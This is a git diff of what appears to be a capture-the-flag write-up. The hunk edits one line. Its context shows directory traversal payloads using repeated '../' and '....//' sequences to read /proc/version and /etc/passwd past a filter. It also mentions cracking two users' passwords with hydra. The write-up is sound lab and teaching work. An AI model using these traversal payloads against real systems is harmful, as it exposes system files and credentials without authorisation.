@@ -32,7 +32,7 @@ data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWlu
 `../../../../../../../../../../../../../../../../../../../../proc/version`
 `..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//proc/version`
 `....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//proc/version`
-- with `....//` it bypassed the measurement - proof of concept was done. Payload was changed to /etc/passed and it also worked. Noted normally or generally numbers of `....//` doesn't matter.
+- with `....//` it bypassed the measurement - proof of concept was done. Payload was changed to /etc/passed and it also worked. Noted normally or excessive numbers of `....//` is fine.
 <img width="993" height="402" alt="Screenshot from 2025-09-26 17-20-46" src="https://github.com/user-attachments/assets/5142d589-c953-4006-8a73-7e38c23d82e0" />
 - users charles and joshua were found. I proceed to try cracking their password using hydra. The second flag was found.
 - <img width="1125" height="858" alt="image" src="https://github.com/user-attachments/assets/8343ce57-0950-4d2a-b86d-791faa31ea20" />
